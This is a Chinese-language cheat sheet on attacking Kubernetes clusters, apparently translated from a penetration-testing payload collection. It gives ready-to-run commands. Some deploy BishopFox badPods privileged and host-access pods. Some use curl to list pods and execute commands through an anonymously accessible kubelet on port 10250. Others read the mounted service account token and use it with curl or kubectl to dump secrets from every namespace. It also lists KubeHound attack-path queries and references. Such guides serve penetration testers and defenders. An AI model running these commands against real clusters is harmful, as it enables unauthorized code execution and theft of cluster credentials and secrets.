# 容器 - Kubernetes

> Kubernetes（通常简称为 K8s）是一个开源的容器编排平台，旨在自动化容器化应用程序的部署、扩展和管理。

## 摘要

- [工具](#工具)
- [漏洞利用](#漏洞利用)
  - [可通过 10250/TCP 访问的 kubelet](#可通过-10250-tcp-访问的-kubelet)
  - [获取服务帐户令牌](#获取服务帐户令牌)
- [参考资料](#参考资料)

## 工具

* [BishopFox/badpods](https://github.com/BishopFox/badpods) - 一系列清单，用于创建具有提升权限的 pod。

  ```ps1
  kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
  kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/pod/priv-and-hostpid-exec-pod.yaml
  kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml
  kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpath/pod/hostpath-exec-pod.yaml
  kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml
  kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostnetwork/pod/hostnetwork-exec-pod.yaml
  kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostipc/pod/hostipc-exec-pod.yaml
  kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml
  ```

* [serain/kubelet-anon-rce](https://github.com/serain/kubelet-anon-rce) - 在允许匿名认证的 kubelet 端点上执行容器中的命令

* [DataDog/KubeHound](https://github.com/DataDog/KubeHound) - Kubernetes 攻击图

  ```ps1
  # 关键路径枚举
  kh.containers().criticalPaths().count()
  kh.containers().dedup().by("name").criticalPaths().count()
  kh.endpoints(EndpointExposure.ClusterIP).criticalPaths().count()
  kh.endpoints(EndpointExposure.NodeIP).criticalPaths().count()
  kh.endpoints(EndpointExposure.External).criticalPaths().count()
  kh.services().criticalPaths().count()
  
  # DNS 服务和端口
  kh.endpoints(EndpointExposure.External).criticalPaths().limit(local,1)
  .dedup().valueMap("serviceDns","port")
  .group().by("serviceDns").by("port")
  ```

## 漏洞利用

### 可通过 10250/TCP 访问的 kubelet

要求：

* `--anonymous-auth`：启用对 Kubelet 服务器的匿名请求

* 获取 pods：`curl -ks https://worker:10250/pods`
* 运行命令：`curl -Gks https://worker:10250/exec/{namespace}/{pod}/{container} -d 'input=1' -d 'output=1' -d'tty=1' -d 'command=ls' -d 'command=/'`

### 获取服务账户令牌

令牌存储在 `/var/run/secrets/kubernetes.io/serviceaccount/token`

使用服务账户令牌：

* 在 `kube-apiserver` API 上：`curl -ks -H "Authorization: Bearer <TOKEN>" https://master:6443/api/v1/namespaces/{namespace}/secrets`
* 与 kubectl 一起使用：`kubectl --insecure-skip-tls-verify=true --server="https://master:6443" --token="<TOKEN>" get secrets --all-namespaces -o json`

## 参考资料

* [通过 Kubelet 攻击 Kubernetes - Withsecure Labs - 2019年1月11日](https://labs.withsecure.com/publications/attacking-kubernetes-through-kubelet)
* [kubehound - 攻击参考](https://kubehound.io/reference/attacks/)
* [KubeHound：识别 Kubernetes 集群中的攻击路径 - Datadog - 2023年10月2日](https://securitylabs.datadoghq.com/articles/kubehound-identify-kubernetes-attack-paths/)